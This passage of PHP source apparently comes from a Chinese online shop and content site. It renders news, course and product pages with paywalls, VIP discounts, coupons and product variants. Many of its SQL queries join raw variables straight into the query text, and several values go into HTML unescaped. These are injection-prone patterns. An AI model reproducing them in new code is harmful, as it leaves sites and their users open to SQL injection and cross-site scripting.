			$s=$s."<span style=\"background:#FFCC00;color:#000000;padding: 0 3px;border-radius: 0 5px 5px 0;\">SVIP￥<span id=\"price_v2\">".p($row["C_price"]*$C_c_discount2/10)."<span></span>";
		}
		$s="<a target=\"_blank\" href=\"member/vip.php\" style=\"font-size: 12px;border-radius: 5px;margin-left: 10px;margin-right: 10px;font-weight: bold;border:solid 1px #000000;\">".$s."</a>";
		$t = str_Replace("[C_vip]",$s,$t);

	}
	return $t;
}

function courseinfo($t){
	global $conn,$id,$C_c_discount,$C_c_discount2,$C_keyword,$C_description;
	$page=intval($_GET["page"]);
	if($page==0){
		$page=1;
	}

	if($_SESSION["M_id"]!=""){
	  $H_id=getrs("select * from sl_history where H_hid=$id and H_mid=".$_SESSION["M_id"]." and H_type=2","H_id");
	  if($H_id!=""){
	      mysqli_query($conn,"update sl_history set H_hid2=$page,H_time='".date('Y-m-d H:i:s')."' where H_id=$H_id");
	  }else{
	      mysqli_query($conn, "insert into sl_history(H_type,H_hid,H_hid2,H_mid,H_time) values(2,$id,$page,".$_SESSION["M_id"].",'".date('Y-m-d H:i:s')."')");
	  }
	}

	$genkey=date('YmdHis').rand(1000,9999);
	
	$sql="select * from sl_course,sl_usort where C_sort=S_id and C_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$C_price=$row["C_price"];

		$lession=explode("||",$row["C_lesson"]);
		for($i=0;$i<count($lession);$i++){
			if(strpos($lession[$i],"_")!==false){
				$l=$l.$lession[$i]."||";
			}
		}

		$ptitle=splitx(splitx($l,"||",($page-1)),"__",0);
		$price=splitx(splitx($l,"||",($page-1)),"__",1);
		$video=splitx(splitx($l,"||",($page-1)),"__",2);

		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[C_id]",$row["C_id"],$t);
		$t = str_Replace("[C_title]",$row["C_title"],$t);
		$t = str_Replace("[C_ptitle]",$ptitle." - ".$row["C_title"],$t);
		$t = str_Replace("[C_pic]",pic($row["C_pic"]),$t);
		$t = str_Replace("[C_price]",$row["C_price"],$t);
		$t = str_Replace("[C_video]","",$t);
	}
	return $t;
}
function newsinfo($t){
	global $conn,$id,$C_n_discount,$C_n_discount2,$C_keyword,$C_description,$C_newsds;

	if($_SESSION["M_id"]!=""){
	  $H_id=getrs("select * from sl_history where H_hid=$id and H_mid=".$_SESSION["M_id"]." and H_type=1","H_id");
	  if($H_id!=""){
	      mysqli_query($conn,"update sl_history set H_time='".date('Y-m-d H:i:s')."' where H_id=$H_id");
	  }else{
	      mysqli_query($conn, "insert into sl_history(H_type,H_hid,H_mid,H_time) values(1,$id,".$_SESSION["M_id"].",'".date('Y-m-d H:i:s')."')");
	  }
	}

	$genkey=t($_GET["genkey"]);
	$sql="select * from sl_news,sl_nsort where N_sort=S_id and N_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_subid]",$row["S_sub"],$t);
		$t = str_Replace("[S_subtitle]",getrs("select * from sl_nsort where S_id=".$row["S_sub"],"S_title"),$t);
		$t = str_Replace("[N_id]",$row["N_id"],$t);
		$t = str_Replace("[N_collection]",getrs("select count(C_id) as C_count from sl_colletion where C_cid=".$row["N_id"]." and C_type=1","C_count"),$t);
		$t = str_Replace("[N_title]",$row["N_title"],$t);
		$t = str_Replace("[N_pic]",pic($row["N_pic"]),$t);
		$t = str_Replace("[N_sort]",$row["N_sort"],$t);
		$t = str_Replace("[N_view]",$row["N_view"],$t);
		$t = str_Replace("[N_author]",$row["N_author"],$t);
		$t = str_Replace("[N_date]",$row["N_date"],$t);
		$t = str_Replace("[N_price]",p($row["N_price"]),$t);
		if($row["N_keywords"]==""){
			$t = str_Replace("[N_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[N_keywords]",$row["N_keywords"],$t);
		}
		if($row["N_description"]==""){
			$t = str_Replace("[N_description]",$C_description,$t);
		}else{
			$t = str_Replace("[N_description]",$row["N_description"],$t);
		}
		$N_vshow=$row["N_vshow"];
		$N_ds=$row["N_ds"];
		$N_dsintro=$row["N_dsintro"];
		$N_content=editor_oss($row["N_content"]);

		if($row["N_video"]!=""){
			if(strpos($row["N_video"],"<")!==false){
			    $N_video=$row["N_video"];
			}else{
			    if(substr($row["N_video"],0,7)=="http://" || substr($row["N_video"],0,8)=="https://"){
			        $N_video="<video width=\"100%\" style=\"max-height:500px;background:#000000\" poster=\"".pic($row["N_pic"])."\" controls controlslist=\"nodownload\"><source src=\"".$row["N_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }else{
			        $N_video="<video width=\"100%\" style=\"max-height:500px;background:#000000\" poster=\"".pic($row["N_pic"])."\" controls controlslist=\"nodownload\"><source src=\"media/".$row["N_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }
			}
			if($N_vshow==0){
				$N_content="<div style=\"margin-bottom:10px;\">".$N_video."</div>".$N_content;
			}else{
				$N_content=$N_content."<div style=\"margin-top:10px;\">".$N_video."</div>";
			}
		}
		if($C_newsds!="" && $N_ds==1){
			$N_content=$N_content."<hr><div style=\"text-align:center;\"><div style=\"font-weight:bold;font-size:15px;\">".$N_dsintro."</div>".$C_newsds."</div>";
		}

		$N_price=p($row["N_price"]);
		$N_date=$row["N_date"];
		$N_long=$row["N_long"];
		$N_tag=$row["N_tag"];
		$tag=explode(" ",$N_tag);
        for($i=0;$i<count($tag);$i++){
        	if($tag[$i]!=""){
        		$tags=$tags."<a style=\"border:solid 1px #AAAAAA;display:inline-block;padding:2px 5px;border-radius:5px;margin:5px;font-size:12px;\" href=\"?type=news&tag=".$tag[$i]."\">".$tag[$i]."</a>";
        	}
    	}
    	if($N_tag!=""){
    		$t = str_Replace("[N_tag]","标签：".$tags,$t);
    	}else{
    		$t = str_Replace("[N_tag]","",$t);
    	}
		$length=mb_strlen(strip_tags($N_content),"utf-8");
		if(strpos($row["N_content"],"[fh_free]")!==false){
			$N_preview=splitx($row["N_content"],"[fh_free]",0)."<div style=\"border-bottom:1px solid #EEEEEE;padding-bottom:30px;margin-bottom:30px;\"></div>";
		}
	}

	$sql="select N_pic,N_date,N_id,N_title from sl_news where N_id = (select N_id from sl_news where N_id < $id and N_del=0 and N_sh=1 order by N_top desc,N_order,N_id desc limit 1)";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if($row["N_id"]==""){
		$N_Ntitle="没有了";
		$N_Nurl="javascript:;";
	}else{
		$N_Ntitle=$row["N_title"];
		$N_Nurl="?type=newsinfo&id=".$row["N_id"];
		$N_Ndate=date("Y-m-d",strtotime($row["N_date"]));
		$N_Npic=pic($row["N_pic"]);
	}

	$sql="select N_pic,N_date,N_id,N_title from sl_news where N_id = (select N_id from sl_news where N_id > $id and N_del=0 order by N_top asc,N_order desc,N_id asc limit 1)";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if($row["N_id"]==""){
		$N_Ptitle="没有了";
		$N_Purl="javascript:;";
	}else{
		$N_Ptitle=$row["N_title"];
		$N_Purl="?type=newsinfo&id=".$row["N_id"];
		$N_Pdate=date("Y-m-d",strtotime($row["N_date"]));
		$N_Ppic=pic($row["N_pic"]);
	}

	$t = str_Replace("[N_Ntitle]",$N_Ntitle,$t);
	$t = str_Replace("[N_Nurl]",$N_Nurl,$t);
	$t = str_Replace("[N_Ptitle]",$N_Ptitle,$t);
	$t = str_Replace("[N_Purl]",$N_Purl,$t);
	$t = str_Replace("[N_Ndate]",$N_Ndate,$t);
	$t = str_Replace("[N_Npic]",$N_Npic,$t);
	$t = str_Replace("[N_Pdate]",$N_Pdate,$t);
	$t = str_Replace("[N_Ppic]",$N_Ppic,$t);

	if($N_price>0){//文章不免费
		if($N_long==0){//没开启了限时付费
			if(getrs("select * from sl_orders where O_content='".$genkey."' and O_nid=".$id,"O_id")!="" && $genkey!=""){//已免登录购买
				$N_tx=str_replace("[fh_free]","",$N_content);
			}else{
				if($_SESSION["M_id"]!=""){//登录了会员
					$sql = "Select * from sl_orders where O_del=0 and O_type=1 and O_state=1 and O_nid=".$id." and O_mid=".intval($_SESSION["M_id"]);
					$result = mysqli_query($conn, $sql);
					$row = mysqli_fetch_assoc($result);
					if (mysqli_num_rows($result) > 0) {//已购买
						$N_tx=str_replace("[fh_free]","",$N_content);
					} else {//没购买
						$sql="select * from sl_member where M_id=".intval($_SESSION["M_id"]);
						$result = mysqli_query($conn, $sql);
						$row = mysqli_fetch_assoc($result);
						$M_viptime=$row["M_viptime"];
						$M_viplong=$row["M_viplong"];
						if($M_viplong-(time()-strtotime($M_viptime))/86400>0){
							if($M_viplong>30000){
								$N_discount=$C_n_discount2/10;
							}else{
								$N_discount=$C_n_discount/10;
							}
						}else{
							$N_discount=1;
						}
						if($N_discount==0){//VIP会员0折
							$N_tx=str_replace("[fh_free]","",$N_content);
						}else{
							$N_tx=$N_preview.buynews("#f32196",$N_price,$id);
						}
					}
				}else{//没登录会员
					$N_tx=$N_preview.buynews("#f32196",$N_price,$id);
				}
			}
		}else{//开启了限时付费
			if(time()>strtotime("+$N_long hour",strtotime($N_date))){//已过收费期
				$N_tx=str_replace("[fh_free]","",$N_content);
			}else{//未过收费期
				$N_tx=$N_preview.buynews("#f32196",$N_price,$id);
			}
		}
	}else{//免费
		$N_tx=str_replace("[fh_free]","",$N_content);
	}
	$t = str_Replace("[N_content]","<div id=\"N_tx\">".$N_tx."</div>",$t);
	return $t;
}

function product($t){
	global $conn,$id,$C_keyword,$C_description;
	$M_id=intval($_GET["M_id"]);
	$sql="select * from sl_psort where S_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_sub]",$row["S_sub"],$t);
		$t = str_Replace("[S_pic]",pic($row["S_pic"]),$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_subtitle]",getrs("select * from sl_psort where S_id=".$row["S_sub"],"S_title"),$t);
		$t = str_Replace("[S_order]",$row["S_order"],$t);
		if($row["S_content"]==""){
			$t = str_Replace("[S_content]",$C_description,$t);
		}else{
			$t = str_Replace("[S_content]",$row["S_content"],$t);
		}
		if($row["S_keywords"]==""){
			$t = str_Replace("[S_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[S_keywords]",$row["S_keywords"],$t);
		}
	}else{
		if(intval($M_id)>0){
			$M=getrs("select * from sl_member where M_id=$M_id");
			$M_shop=$M["M_shop"];
			$M_head=$M["M_head"];
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]",$M_shop,$t);
			$t = str_Replace("[S_content]",$M_shop,$t);
			$t = str_Replace("[S_keywords]",$M_shop,$t);
			$t = str_Replace("[S_pic]",pic($M_head),$t);
		}else{
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]","全部商品",$t);
			$t = str_Replace("[S_keywords]","全部商品",$t);
			$t = str_Replace("[S_content]","ALL PRODUCT",$t);
			$t = str_Replace("[S_pic]",pic("nopic.png"),$t);
		}
	}
	return $t;
}

function productinfo($t){
	global $conn,$id,$C_notice,$C_keyword,$C_description,$C_p_discount,$C_p_discount2,$C_fx1,$C_fx2,$C_fx3,$config;

	if($_SESSION["M_id"]!=""){
	  $H_id=getrs("select * from sl_history where H_hid=$id and H_mid=".$_SESSION["M_id"]." and H_type=0","H_id");
	  if($H_id!=""){
	      mysqli_query($conn,"update sl_history set H_time='".date('Y-m-d H:i:s')."' where H_id=$H_id");
	  }else{
	      mysqli_query($conn, "insert into sl_history(H_type,H_hid,H_mid,H_time) values(0,$id,".$_SESSION["M_id"].",'".date('Y-m-d H:i:s')."')");
	  }
	}

	$B_count=getrs("select count(*) as B_count from sl_orders where O_del=0 and O_state>0 and O_pid=".$id,"B_count");
	$E_count=getrs("select count(*) as E_count from sl_evaluate,sl_orders where O_del=0 and E_del=0 and O_state>0 and E_oid=O_id and O_pid=$id","E_count");

	$sql="select * from sl_product,sl_psort where P_sort=S_id and P_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$P_fx=$row["P_fx"];
		$P_price=$row["P_price"];
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_subid]",$row["S_sub"],$t);
		$t = str_Replace("[S_subtitle]",getrs("select * from sl_psort where S_id=".$row["S_sub"],"S_title"),$t);
		$t = str_Replace("[P_id]",$row["P_id"],$t);
		$t = str_Replace("[P_collection]",getrs("select count(C_id) as C_count from sl_colletion where C_cid=".$row["P_id"]." and C_type=0","C_count"),$t);
		$t = str_Replace("[P_title]",$row["P_title"],$t);
		$t = str_Replace("[P_view]",$row["P_view"],$t);
		$t = str_Replace("[P_time]",$row["P_time"],$t);
		$t = str_Replace("[P_sold]",$row["P_sold"],$t);
		if($row["P_keywords"]==""){
			$t = str_Replace("[P_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[P_keywords]",$row["P_keywords"],$t);
		}
		if($row["P_description"]==""){
			$t = str_Replace("[P_description]",$C_description,$t);
		}else{
			$t = str_Replace("[P_description]",$row["P_description"],$t);
		}
		$t = str_Replace("[P_pic]",pic(splitx($row["P_pic"],"|",0)),$t);
		if($row["P_mid"]==0){
			$zy="<span style=\"font-size:12px;background:#c81623;border-radius:5px;padding:2px 3px;color:#ffffff;margin-right:5px;display:inline;\">自营</span>";
			$shop="<span style=\"font-size:12px;background:#c81623;border-radius:5px;padding:2px 3px;color:#ffffff;display:inline;margin:0 2px;\">官方自营店</span>";
		}else{
			$zy="";
			$shop="<a href=\"./?type=product&M_id=".intval($row["P_mid"])."\" style=\"font-size:12px;background:#0099ff;border-radius:5px;padding:2px 3px;color:#ffffff;display:inline;margin:0 2px;\">".getrs("select * from sl_member where M_id=".intval($row["P_mid"]),"M_shop")."</a>";
		}
		$t = str_Replace("[P_zy]",$zy,$t);
		$t = str_Replace("[P_shop]",$shop,$t);

		$P_content=editor_oss($row["P_content"]);

		if($P_fx==1 && $P_price>0 && ($C_fx1>0 || $C_fx2>0 || $C_fx3>0)){
			$P_content="<div style=\"padding:20px;margin-bottom:20px;background:url('images/pricebg.png')\">分享商品可得佣金【".($C_fx1*$P_price/100)."元】 <a style=\"float:right;background:#f32196;color:#ffffff;border-radius:5px;padding:0 5px\" href=\"conn/poster.php?type=product&id=$id&from=".intval($_SESSION["M_id"])."\">点击参与</a></div>".$P_content;
		}

		$P_vshow=$row["P_vshow"];

		if($row["P_shuxing"]!=""){
			$s=explode("\r",$row["P_shuxing"]);
			for($i=0;$i<count($s);$i++){
				$shuxing=$shuxing."<div style=\"width:33%;display:inline-block\">".$s[$i]."</div>";
			}
			$shuxing="<div style=\"background:#f7f7f7;border:solid 1px #DDDDDD;padding:20px;margin-bottom:10px;\"><p><b>商品参数：</b></p>".$shuxing."</div>";
		}
		if($row["P_video"]!=""){
			if(strpos($row["P_video"],"<")!==false){
			    $P_video=$row["P_video"];
			}else{
			    if(substr($row["P_video"],0,7)=="http://" || substr($row["P_video"],0,8)=="https://"){
			        $P_video="<video width=\"100%\" style=\"max-height:500px;background:#000000;\"  poster=\"".pic(splitx($row["P_pic"],"|",0))."\" controls controlslist=\"nodownload\"><source src=\"".$row["P_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }else{
			        $P_video="<video width=\"100%\"  style=\"max-height:500px;background:#000000;\" poster=\"".pic(splitx($row["P_pic"],"|",0))."\" controls controlslist=\"nodownload\"><source src=\"media/".$row["P_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }
			}
			if($P_vshow==0){
				$P_content="<div style=\"margin-bottom:10px;\">".$P_video."</div>".$P_content;
			}else{
				$P_content=$P_content."<div style=\"margin-bottom:10px;\">".$P_video."</div>";
			}
		}
		$t = str_Replace("[P_shuxing]",$shuxing,$t);
		$t = str_Replace("[P_content]",$P_content,$t);
		$t = str_Replace("[P_sort]",$row["P_sort"],$t);
		if($row["P_viponly2"]==1){
			$s="<a target=\"_blank\" href=\"member/vip.php\" style=\"font-size: 12px;border-radius: 5px;margin-left: 10px;margin-right: 10px;font-weight: bold;border:solid 1px #000000;\"><span style=\"padding: 0 3px;background: #000000;color: #FFCC00;\">仅限永久VIP购买</span></a>";
			$t = str_Replace("[P_vip]",$s,$t);
		}else{
			if($row["P_viponly"]==1){
				$s="<a target=\"_blank\" href=\"member/vip.php\" style=\"font-size: 12px;border-radius: 5px;margin-left: 10px;margin-right: 10px;font-weight: bold;border:solid 1px #000000;background: #fc0;\"><span style=\"padding: 0 3px;color: #000;\">仅限VIP购买</span></a>";
				$t = str_Replace("[P_vip]",$s,$t);
			}else{
				if($row["P_vip"]==1){//如果商品开启了参与VIP活动
					if($C_p_discount<10){//普通VIP有折扣
						$s="<span style=\"padding: 0 3px;background: #000000;color: #FFCC00;\">VIP￥<span id=\"price_v1\">".p($row["P_price"]*$C_p_discount/10)."</span></span>";
					}
					if($C_p_discount2<$C_p_discount){
						$s=$s."<span style=\"background:#FFCC00;color:#000000;padding: 0 3px;border-radius: 0 5px 5px 0;\">SVIP￥<span id=\"price_v2\">".p($row["P_price"]*$C_p_discount2/10)."<span></span>";
					}
					$s="<a target=\"_blank\" href=\"member/vip.php\" style=\"font-size: 12px;border-radius: 5px;margin-left: 10px;margin-right: 10px;font-weight: bold;border:solid 1px #000000;\">".$s."</a>";
					$t = str_Replace("[P_vip]",$s,$t);
				}else{
					$t = str_Replace("[P_vip]","",$t);
				}
			}
		}
		
		if($row["P_limit"]>0 and $row["P_limitlong"]>0 and $row["P_limitlong"]-(time()-strtotime($row["P_limittime"]))/3600>0){
			$P_price=$row["P_limit"];
			$t = str_Replace("[P_price]",$row["P_limit"],$t);
			$t = str_Replace("[P_limit]","<span style=\"color:#f32196;border-bottom: 1px dotted #f32196;cursor:pointer;font-size:12px;\"><b>限时特惠：</b>原价<span style=\"text-decoration:line-through;color:#aaa;font-size:15px;font-weight:bold;\">￥".p($row["P_price"])."</span>，特惠价<span style=\"font-size:15px;font-weight:bold;\">￥".$row["P_limit"]."</span>起，<b>
        <span id=\"_d\">00</span><span id=\"_h\">00</span><span id=\"_m\">00</span><span id=\"_s\">00</span>
    </b>后结束</span>
    <script>
    countTime();
    function countTime() {
            //获取当前时间
            var date = new Date();
            var now = date.getTime();
            //设置截止时间
            var endDate = new Date(\"".date('Y-m-d H:i:s',strtotime('+'.$row["P_limitlong"].' hour',strtotime($row["P_limittime"])))."\");
            var end = endDate.getTime();
            //时间差
            var leftTime = end-now;
            //定义变量 d,h,m,s保存倒计时的时间
            var d,h,m,s;
            if (leftTime>=0) {
                d = Math.floor(leftTime/1000/60/60/24);
                h = Math.floor(leftTime/1000/60/60%24);
                m = Math.floor(leftTime/1000/60%60);
                s = Math.floor(leftTime/1000%60);                   
            }
            //将倒计时赋值到div中
            document.getElementById(\"_d\").innerHTML = d+\"天 \";
            document.getElementById(\"_h\").innerHTML = h+\":\";
            document.getElementById(\"_m\").innerHTML = m+\":\";
            document.getElementById(\"_s\").innerHTML = s+\"\";
            //递归每秒调用countTime方法，显示动态时间效果
            setTimeout(countTime,1000);
        }
        </script>
        ",$t);
		}else{
			$t = str_Replace("[P_price]",p($row["P_price"]),$t);
			$t = str_Replace("[P_limit]","",$t);
			$P_price=$row["P_price"];
		}

		$t = str_Replace("[P_sell]",$row["P_sell"],$t);
		$t = str_Replace("[P_selltype]",$row["P_selltype"],$t);
		$t = str_Replace("[B_count]",$B_count,$t);
		$t = str_Replace("[E_count]",$E_count,$t);
		
		$t = str_Replace("[P_vipprice]",p($row["P_price"]*$C_p_discount/10),$t);
		$t = str_Replace("[P_svipprice]",p($row["P_price"]*$C_p_discount2/10),$t);

		$P_selltype=$row["P_selltype"];
		$P_sell=$row["P_sell"];
		$P_gg=$row["P_gg"];
		$P_ggsell=$row["P_ggsell"];
		$P_restx=$row["P_rest"];
		$P_tag=$row["P_tag"];
		$P_mid=$row["P_mid"];
		$tag=explode(" ",$P_tag);
        for($i=0;$i<count($tag);$i++){
        	$tags=$tags."<a style=\"border:solid 1px #AAAAAA;display:inline-block;padding:2px 5px;border-radius:5px;margin:5px;font-size:12px;\" href=\"?type=product&tag=".$tag[$i]."\">".$tag[$i]."</a>";
    	}
    	if($P_tag!=""){
    		$t = str_Replace("[P_tag]","标签：".$tags,$t);
    	}else{
    		$t = str_Replace("[P_tag]","",$t);
    	}

    	$sql="select Q_title,Q_pid from (select * from sl_quan where ((Q_fid=".$P_mid." and Q_pid=0) or (Q_pid=".$id." and Q_fid=".$P_mid.")) and Q_del=0 and Q_hide=0 and Q_gettime>now())b group by Q_title,Q_pid order by Q_pid asc";
		$result = mysqli_query($conn,  $sql);
		if (mysqli_num_rows($result) > 0) {
		while($row = mysqli_fetch_assoc($result)) {
				$Q=getrs("select * from sl_quan where Q_title='".$row["Q_title"]."'");
				$rest=getrs("select count(Q_id) as Q_count from sl_quan where Q_del=0 and Q_hide=0 and Q_mid=0 and Q_gettime>now() and Q_title='".$Q["Q_title"]."'","Q_count");
				if($Q["Q_pid"]>0){
					$P_info="商品优惠券";
				}else{
					$P_info="店铺优惠券";
				}

				if($Q["Q_discount"]>0){
					$D_info="".((100-$Q["Q_discount"])/10)."折";
				}else{
					$D_info="";
				}

				if($Q["Q_minuse"]>0){
					$M_info="".$Q["Q_minuse"]."元";
				}else{
					$M_info="";
				}

				if($_SESSION["M_id"]!="" && getrs("select * from sl_quan where Q_mid=".intval($_SESSION["M_id"])." and Q_title='".$Q["Q_title"]."'")){
					$btn="<span style=\"color:#f32196;border-bottom: 1px dotted #f32196;\">已领</span>";
				}else{
					$btn="<span id=\"quan_btn_".$Q["Q_id"]."\" style=\"color:#f32196;border-bottom: 1px dotted #f32196;cursor:pointer;\" onclick=\"getquan(".$Q["Q_id"].")\">领券</span> <span id=\"login_".$Q["Q_id"]."\"></span>";
				}

		        $quan=$quan."
		    <script>
			function getquan(id){
				\$.ajax({
		            url: \"conn/f.php?action=getquan&Q_id=\"+id,
		            success: function(data) {
		                data = JSON.parse(data);
		                if (data.code == \"success\") {
		                    \$(\"#quan_btn_\"+id).html(\"已领\");
		                    \$(\"#quan_btn_\"+id).attr(\"onclick\",\"\");
		                } else {
		                    alert(data.msg);
		                    if(data.msg==\"请先登录会员帐号！\"){
		                    	\$(\"#login_\"+id).html(\"<a style='color:#f32196;border-bottom: 1px dotted #f32196;cursor:pointer;' href='member/login.php?from=\"+encodeURIComponent(window.location.href)+\"'>登录</a>\");
		                    }
		                }
		            }
		        });
			}
			</script>
		        <div style=\"margin-bottom:8px;\"><span style=\"color:#f32196;border:solid 1px #f32196;border-radius:5px;padding:0 2px\"><span style=\"border-right: 1px dotted #f32196;padding-right:5px;margin-right:5px\">".$Q["Q_title"]."</span>".$P_info."</span> ".$M_info.$D_info."优惠券 满".$Q["Q_money"]."元可用 ".$btn."</div>";
		    }
		}
		if($quan!=""){
			if(!isMobile()){
				$quan="<div style=\"display:inline-block;width:50px;float:left\"><b>优惠</b></div><div style=\"display:inline-block;width:calc(100% - 50px);font-size:12px\">".$quan."</div>";
			}
		}
		if($config->quan=="true"){
			$t = str_Replace("[P_quan]",$quan,$t);
		}else{
			$t = str_Replace("[P_quan]","",$t);
		}

    	$P_js = "
			<script>
			var P_price=$P_price;
			\$(function() {
			\$('#buy label').click(function(){
				var aa = \$(this).attr('aa');\$('[aa='+aa+']').removeAttr('class') ;\$(this).attr('class','checked');
				if(\$(this).attr(\"data-pic\")!=''){
					\$(\"#P_pic\").attr(\"src\",\$(this).attr(\"data-pic\"));
				}
			});
			\$(\"#buy label[data-title]\").click(function(){
				\$(\"label[class='checked'][data-title]\").each(function(i){

			        if(0==i){
			        	if(\$(this).attr(\"data-price\").substr(0,1)==\"*\"){
			        		q = Number(\$(this).attr(\"data-price\").substr(1));
			        		p = 0;
			        	}else{
			        		q = 1;
			        		p = Number(\$(this).attr(\"data-price\"));
			        	}
			            t = \$(this).attr(\"data-title\");
			        }else{
			        	if(\$(this).attr(\"data-price\").substr(0,1)==\"*\"){
			        		q = q * Number(\$(this).attr(\"data-price\").substr(1));
			        	}else{
			        		p = p + Number(\$(this).attr(\"data-price\"));
			        	}
			            t=t+\" \"+\$(this).attr(\"data-title\");
			        }
			    });
				\$(\"#price\").html(((P_price+p)*q).toFixed(2));
				\$(\"#price_v1\").html(((P_price+p)*q*".($C_p_discount/10).").toFixed(2));
				\$(\"#price_v2\").html(((P_price+p)*q*".($C_p_discount2/10).").toFixed(2));
				\$(\"#gg_title\").html(t);

				if(\$(this).attr(\"aa\").split(\"_\")[1]==0){
					\$(\"#gg_rest\").html(\$(this).attr(\"data-restTitle\"));
					\$(\"#buy #plus\").attr(\"onClick\",\"javascript:if(this.form.amount.value<\"+\$(this).attr(\"data-rest\")+\"){this.form.amount.value++;}\");
					if(\$(this).attr(\"data-rest\")<\$(\"#amount\").val()){
						\$(\"#amount\").val(\$(this).attr(\"data-rest\"));
					}
					if(\$(this).attr(\"data-rest\")==0){
						\$(\"#buy button\").attr(\"disabled\",\"true\");
						\$(\"#buy button\").html(\"暂时缺货\");
						\$(\"#buy input[type='submit']\").attr(\"disabled\",\"true\");
						\$(\"#buy input[type='submit']\").attr(\"value\",\"暂时缺货\");
					}else{
						\$(\"#buy button\").removeAttr(\"disabled\");
						\$(\"#buy #cart_btn\").html(\"加入购物车\");
						\$(\"#buy input[type='submit']\").removeAttr(\"disabled\");
						\$(\"#buy input[type='submit']\").attr(\"value\",\"立即购买\");
					}
				}
			 }); 
			\$(\"#buy div\").find(\"label:first\").addClass(\"checked\");
			\$(\"#buy div\").find(\"input:first\").attr(\"checked\",\"checked\");
			\$(\"#buy div\").find(\"label:first\").trigger(\"click\");
			})
			</script>
            <style>
            input[type='radio'] {display: none;}
            #buy label {line-height:150%;display:inline-block;margin-bottom:5px;padding:2px 10px;cursor: pointer;border: #ccc solid 2px;border-radius: 3px;color:#000;}
            #buy .checked {border: #f32196 solid 2px;border-radius: 3px;color: #fff;background:#f32196}
            #buy label .text{font-size:12px;text-align:center;padding-top:3px;margin:0 -10px;width:75px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
            #buy label img{width:75px;height:75px;margin:-2px -10px}
            </style>";
            $shuxing = explode("@", $P_gg);
            if($P_gg!=""){
                for ($j = 0; $j < count($shuxing); $j++) {
                    if ($shuxing[$j] != "__") {
                        $P_sc = $P_sc . "<div style=\"margin-bottom:5px;\"><div style=\"display:inline-block;width:50px;float:left\"><b>" . splitx($shuxing[$j], "_", 0) . "</b></div> <div style=\"display:inline-block;width:calc(100% - 50px)\">";
                        $P_sc2 = $P_sc2 . "<b>" . splitx($shuxing[$j], "_", 0) . "</b> ";
                        $sc = explode("|", splitx($shuxing[$j], "_", 1));
                        $pc = explode("|", splitx($shuxing[$j], "_", 3));
                        $gg_price=explode("|", splitx($shuxing[$j], "_", 2));
                        for ($i = 0; $i < count($sc); $i++) {
                        	if($P_ggsell!=""){
	                        	$gg_sell=explode("\n", $P_ggsell);
	                        	switch(splitx($gg_sell[$i],"|",0)){
	                        		case 0:
	                        		$gg_rest=999999999;
	                        		$gg_rest_title="充足";
	                        		break;
	                        		case 1:
	                        		$gg_rest=getrs("select count(C_id) as C_count from sl_card where C_use=0 and C_del=0 and C_sort=".intval(splitx($gg_sell[$i],"|",1)),"C_count");
	                        		$gg_rest_title=getrs("select count(C_id) as C_count from sl_card where C_use=0 and C_del=0 and C_sort=".intval(splitx($gg_sell[$i],"|",1)),"C_count")."件";
	                        		break;
	                        		case 2:
	                        		$gg_rest=$P_restx;
	                        		$gg_rest_title=$P_restx."件";
	                        		break;
	                        	}
                        	}else{
							    switch ($P_selltype) {
									case 0:
										$gg_rest_title="充足";
										$gg_rest=999999999;
										break;

										case 1:
										$gg_rest_title=getrs("select count(C_id) as C_count from sl_card where C_sort=".intval($P_sell)." and C_use=0 and C_del=0","C_count")."件";
										$gg_rest=getrs("select count(C_id) as C_count from sl_card where C_sort=".intval($P_sell)." and C_use=0 and C_del=0","C_count");
										break;

										case 2:
										$gg_rest_title=$P_restx."件";
										$gg_rest=$P_restx;
										break;
								}
                        	}
                        	if($pc[$i]!=""){
                        		if(isMobile()){
                        			$P_sc = $P_sc . "<label data-pic='media/".$pc[$i]."' data-title='".$sc[$i]."' data-rest='".$gg_rest."' data-restTitle='".$gg_rest_title."' data-price='".p($gg_price[$i])."' aa='scvvvvv_" . $j . "'><input type='radio' name='scvvvvv_" . $j . "' id='" . $j . "_" . $i . "' value='" . $i . "'> <img src='media/".$pc[$i]."' title='".$sc[$i]."'><div class='text'>".$sc[$i]."</div></label> ";
                        		}else{
                        			$P_sc = $P_sc . "<label data-pic='media/".$pc[$i]."' data-title='".$sc[$i]."' data-rest='".$gg_rest."' data-restTitle='".$gg_rest_title."' data-price='".p($gg_price[$i])."' aa='scvvvvv_" . $j . "'><input type='radio' name='scvvvvv_" . $j . "' id='" . $j . "_" . $i . "' value='" . $i . "'> <img src='media/".$pc[$i]."' style='width:38px;height:38px;margin:-1px -9px' title='".$sc[$i]."'></label> ";
                        		}
                        		
                        	}else{
